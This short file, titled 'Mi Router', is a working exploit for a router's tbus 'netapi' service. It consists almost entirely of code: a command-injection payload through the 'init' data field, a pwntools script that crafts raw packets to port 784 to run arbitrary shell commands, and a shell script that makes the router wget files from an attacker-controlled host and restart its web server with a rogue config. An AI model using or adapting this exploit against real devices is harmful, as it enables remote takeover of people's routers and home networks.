# Mi Router

```python
tbus -v list netapi: view tbus interface of object netapi
tbus call netapi init "{\"data\":\"\$(echo 1>/tmp/kirin)\"}"

magic.conf:
events {
	use epoll;
	worker_connections  256;
}
http {
	server {
		listen 80;
		root /tmp;
	}
}

exp.sh:
#!/bin/sh
python3 exp.py 192.168.31.1 "wget -O /tmp/index.html http://$1:8000/index.html" 1>/dev/null
python3 exp.py 192.168.31.1 "wget -O /tmp/magic.conf http://$1:8000/magic.conf" 1>/dev/null
python3 exp.py 192.168.31.1 "killall sysapihttpd && sysapihttpd -c /tmp/magic.conf"  1>/dev/null

exp.py:
#!/usr/bin/env python3
# -*- coding=utf-8 -*-

import sys
from pwn import *

context.log_level="debug"
r = remote(sys.argv[1], 784)
print(r.read())


cmd = f"$({sys.argv[2]})".encode()
cmd += b"\x00"

cmd += (4-len(cmd)%4) * b"\x00"

len1 = 0x10 + len(cmd)
len2 = len1 - 4
len3 = len2 + 28
len1 = len1.to_bytes(1,"big")
len2 = len2.to_bytes(1,"big")
len3 = p32(len3, endian="big")

payload1 = b"\x00\x04\x01\x00" + b"\x00"*4 + b"\x00\x00\x00\x10"
payload1 += b"\x02\x00\x00\x0bnetapi\x00\x00"
r.send(payload1)
data1 = r.read()
print(r.read())

sig = data1[0x1c:0x1c+4]
sig2 = sig[::-1]

payload2 = b"\x00\x05\x02\x00" + sig2 + len3
payload2 += b"\x03\x00\x00\x08" + sig + b"\x04\x00\x00\x09" + b"init\x00\x00\x00\x00"
payload2 += b"\x07\x00\x00" + len1 + b"\x83\x00\x00" + len2 + b"\x00\x04data\x00\x00" + cmd

r.send(payload2)
print(r.read())
```